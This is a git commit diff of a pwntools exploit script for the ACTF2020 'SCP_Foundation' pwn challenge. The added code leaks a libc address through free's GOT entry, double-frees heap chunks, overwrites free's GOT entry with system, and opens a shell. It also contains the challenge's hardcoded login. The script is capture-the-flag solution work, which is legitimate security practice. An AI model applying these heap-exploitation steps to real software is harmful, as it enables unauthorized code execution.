7a9dfae13845ac73dad89789a91dac1343e4f14d
TaQini <742954809@qq.com>
2020-02-23 17:25:22 +0800

    slove scp_found..

--- ACTF2020/pwn/unsolved/SCP_Foundation/SCP_Foundation.py
+++ ACTF2020/pwn/unsolved/SCP_Foundation/SCP_Foundation.py
@@ -44,12 +44,14 @@ info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
 def debug(cmd=''):
     if is_local: gdb.attach(p,cmd)
 
-def add(n_size, name='aa', d_size, desc='bb'):
+def add(n_size, name, d_size, desc):
     sla('want to do :','2')
     sla('> SCP name\'s length : ', str(n_size))
-    sla('> SCP name : ',name)
+    sea('> SCP name : ',name)
+    sleep(0.1)
     sla('length : ',str(d_size))
-    sla('SCP description : ',desc)
+    sea('SCP description : ',desc)
+    sleep(0.1)
 
 def dlt(index):
     sla('want to do :','4')
@@ -57,24 +59,43 @@ def dlt(index):
 
 def show(index):
     sla('want to do :','5')
-    sleep(0.5)
+    sleep(0.1)
     sla('> SCP project ID : ',str(index))
+    ru('# SCP\'s name is ')
+    return rc(6)
 
 def login():
     sla('> Username:','TaQi')
     sla('> Password:','For_the_glory_of_Brunhild')
 
-
 login()
-add(64,'AAAA',64,'aaaa')
-add(64,'BBBB',64,'bbbb')
-add(64,'CCCC',64,'cccc')
-dlt(2)
-dlt(1)
+
+add(0x28,'AAAAAAAA',0x58,'aaaaaaaa') #0
+add(0x28,'BBBBBBBB',0x58,'bbbbbbbb') #1
+add(0x28,'CCCCCCCC',0x58,'cccccccc') #2
+
+# leak libc
 dlt(0)
-debug()
-show(0)
-show(1)
+dlt(1)
+add(0x18,p64(elf.got['free']),0x18,'dddddddd') #3
+free = uu64(show(0))
+libc_base = free - libc.sym['free']
+info_addr('libc_base',libc_base)
+system = libc_base + libc.sym['system']
+dlt(3)
+
+# double free
+dlt(0)
+add(0x28,p64(0xdeadbeef),0x58,p64(elf.got['free']-16-14)) #4
+add(0x28,p64(0xdeadbeef),0x58,'eeeeeeee') #5
+add(0x28,p64(0xdeadbeef),0x58,'ffffffff') #6
+
+# overwrite free got
+# debug()
+add(0x28,'/bin/sh\0',0x58,'a'*14+p64(system)) #7
+
+# system('/bin/sh')
+dlt(7)
 
 p.interactive()
 
